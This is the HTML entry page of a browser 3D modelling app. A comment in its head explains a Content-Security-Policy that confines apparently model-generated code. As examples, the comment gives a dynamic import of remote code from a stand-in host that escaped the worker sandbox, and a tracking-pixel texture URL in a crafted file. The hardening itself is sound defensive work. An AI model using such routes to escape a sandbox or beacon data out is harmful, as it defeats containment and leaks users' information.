<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <!-- viewport-fit=cover is what makes env(safe-area-inset-*) report real
         numbers on a notched iPhone; without it they are all zero and the
         status bar sits under the home indicator. -->
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
    <!-- Installed from the Home Screen this opens without Safari chrome. -->
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
    <meta name="apple-mobile-web-app-title" content="The Culp Mixer" />
    <title>The Culp Mixer — 3D modelling</title>
    <meta name="description" content="The Culp Mixer is a proprietary 3D modelling application that runs in the browser and on your desktop: mesh editing, sculpting, rigging, animation, materials and glTF export. 33-hour free trial, then $199/month." />
    <!--
      The browser-level half of the sandbox.

      Generated code runs in a blob Worker with the global surface swept down
      to an allowlist, which stops it *naming* a network API. It does not stop
      dynamic import(), because that is syntax rather than a global: a program
      could write import("http://example.com/x.js") and the browser would
      fetch it. Verified, not theorised — it reached a server before this line
      existed.

      A blob Worker inherits the policy of the document that created it, so
      script-src here is what shuts that door. 'unsafe-eval' is required: the
      harness compiles the program with the Function constructor, which is the
      same mechanism that lets it control what the program can see.

      img-src is the second layer under a different hole: a crafted .mixer file
      carrying a texture url of https://someone/pixel.png?who=you fired the
      moment the file opened. That is filtered where the document is parsed,
      which is the real fix; this stops anything that ever gets past it.

      connect-src is left open on purpose. The Culp Mixer talks to whatever local model
      endpoint the person configures — often http://localhost:11434 — and
      narrowing it here would break that without protecting the sandbox, whose
      own reach is already gone.
    -->
    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:; img-src 'self' data: blob:; object-src 'none'; base-uri 'self'" />
    <meta name="color-scheme" content="dark" />
    <meta name="theme-color" content="#1b1a1d" />
    <link rel="manifest" href="manifest.webmanifest" />
    <link rel="apple-touch-icon" href="icon-192.png" />
    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%231b1a1d'/%3E%3Cpath d='M16 5l9 5.5v11L16 27l-9-5.5v-11z' fill='none' stroke='%23ff9e2c' stroke-width='2'/%3E%3C/svg%3E" />
  </head>
  <body>
    <div id="app"></div>
    <noscript>The Culp Mixer is an interactive 3D application and needs JavaScript enabled.</noscript>
    <script type="module" src="/src/main.ts"></script>
  </body>
</html>
